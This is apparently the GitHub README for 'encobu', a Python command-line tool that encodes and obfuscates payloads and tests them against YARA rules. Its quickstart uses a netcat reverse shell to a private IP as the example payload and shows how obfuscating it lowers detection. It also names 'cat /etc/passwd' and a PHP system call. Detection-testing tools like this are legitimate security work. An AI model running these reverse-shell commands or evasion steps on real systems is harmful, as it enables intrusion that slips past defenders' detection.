```text
                         __         
  ___  ____  _________  / /_  __  __
 / _ \/ __ \/ ___/ __ \/ __ \/ / / /
/  __/ / / / /__/ /_/ / /_/ / /_/ / 
\___/_/ /_/\___/\____/_.___/\__,_/  
                                     
```
# encobu

A lightweight, no-nonsense CLI tool to encode, obfuscate, and test payloads against static YARA detection rules.

Built primarily using Python's standard library alongside `rich` for terminal UI and `yara-x` for rule matching.

![encobu demo](https://github.com/user-attachments/assets/6b25e3d5-beb9-41ff-a31f-5ab3466d8250)

---

## Why this exists

This project started as a hands-on learning lab to level up both my Python software engineering and cybersecurity fundamentals. 

I've always been inspired by tools like **CyberChef** and how they make data transformation very easy and beginner-friendly. I wanted to build something similar for the terminal—a lightweight tool designed specifically for payload manipulation and defensive evasion testing.

Through building `encobu`, my goals were to:
- **Master Modern Python Engineering**: Move beyond "tutorial-hell", commit to a project, understand modern standards and follow them as close as possible—focusing on project structuring, OOP concepts, Python packaging, and writing tests.
- **Understand Evasion Mechanics**: Implement popular obfuscation algorithms on my own to build confidence in my problem-solving and coding logic.
- **Learn YARA Detection Hands-On**: I had heard about YARA, but had never taken the time to understand what it is and how it works under the hood. This project pushed me to write real YARA rules—progressing from simple string matching to complex regex patterns (and picking up regex skills along the way).

---

## Features

- **Encoding & Decoding**: Base64, ROT13, XOR (with custom key), and multi-layer combinations (`b64-rot13`, `xor-b64-rot13`).
- **Obfuscation Algorithms**:
  - **RCI** (Random Character Insertion): Injects noise characters at regular intervals (supports `--poly` for randomized noise).
  - **SAC** (Split and Concatenate): Splits strings into fragments joined by a custom operator (like `.` in PHP or `+` in PowerShell/Python).
  - **RIT** (Reversible Transformation / Atbash cipher): Mirrors characters across the alphabet.
  - **ESO** (Escape Sequence Obfuscation): Converts characters into hexadecimal escape sequences (`\x65\x63...`).
- **De-obfuscation**: Built-in decoders to reverse your obfuscations and verify payload integrity.
- **YARA Testing Engine**: Run your payload against a single `.yar`/`.yara` file or an entire directory of rules.
- **Reporting**:
  - **Summary Mode (`-s`)**: View detection stats, MITRE ATT&CK tags, and CVSS severity scores.
  - **Comparison Mode (`-o` / `-m`)**: Compare the baseline test with the modified test to see the exact evasion rate.
- **Pipe-Friendly**: Raw payloads output cleanly to `stdout` so you can pipe into other tools (`| nc ...`), while warnings and errors go to `stderr`.

---

## Installation

Clone the repository and set up a virtual environment:

```bash
git clone https://github.com/SpoodoW/encobu.git
cd encobu

# Create and activate virtual environment
python -m venv .venv

# On Linux/macOS:
source .venv/bin/activate
# On Windows:
.venv\Scripts\activate

# Standard installation for users
pip install .

# Or for local development / contributors:
pip install -e .
```

---

## Quickstart: The Evasion Workflow

Here is a common scenario: testing whether obfuscating a reverse shell bypasses basic detection.

### 1. Test your raw payload

Scan a raw payload against your YARA rules directory:

```bash
encobu test -P "nc -e /bin/sh 10.0.0.1 4444" -r rules/
```

### 2. Obfuscate the payload

Take the same command and run it through Escape Sequence Obfuscation:

```bash
encobu obfus -P "nc -e /bin/sh 10.0.0.1 4444" -a eso > payload_eso.txt
```

### 3. Test the obfuscated payload

```bash
encobu test -F payload_eso.txt -r rules/
```

_Output: Results are saved to_
`test_results/payload_eso_results.json`

### 4. Compare the results

Generate a comparison report between both runs:

```bash
encobu report -o test_results/inline_<hash>_results.json -m test_results/payload_eso_results.json
```

This prints a comparison panel showing whether detections dropped and your final evasion rate

---

## Command Reference

### `encobu encode` / `decode`

```bash
# Base64
encobu encode -P "whoami" -m b64

# Multi-layer XOR + Base64 + ROT13
encobu encode -P "whoami" -m xor-b64-rot13 -k "iwantoeatpizza"

# Decode back
encobu decode -P "<encoded_string>" -m from-xor-b64-rot13 -k "iwantoeatpizza"
```

### `encobu obfus` / `deobfus`

```bash
# Random Character Insertion (Stride: 2, Noise: 2)
encobu obfus -P "whoami" -a rci -s 2 -n 2

# Polymorphic insertion (different random characters each time)
encobu obfus -P "whoami" -a rci -s 2 -n 2 --poly

# Split and Concatenate with PHP operator
encobu obfus -P 'system("id");' -a sac -c "."

# Reverse the obfuscation
encobu deobfus -P "whXXoaYYmi" -a rci -s 2 -n 2
```

### `encobu test`

```bash
# Test inline payload against a rules folder
encobu test -P "cat /etc/passwd" -r rules/

# Test a script file against specific rules
encobu test -F exploit.sh -r rules/reverse_shell.yar rules/port_scan.yar

# Add and validate a new YARA rule to the rules library
encobu test -A custom_rule.yar
```

### `encobu report`

```bash
# Summary table of all tests in directory
encobu report -s test_results/

# Compare baseline vs obfuscated
encobu report -o baseline.json -m modified.json
```

---

## Disclaimer

This project was built for educational purposes, security research, and authorized penetration testing only. Do not use this tool against systems or networks without explicit authorization.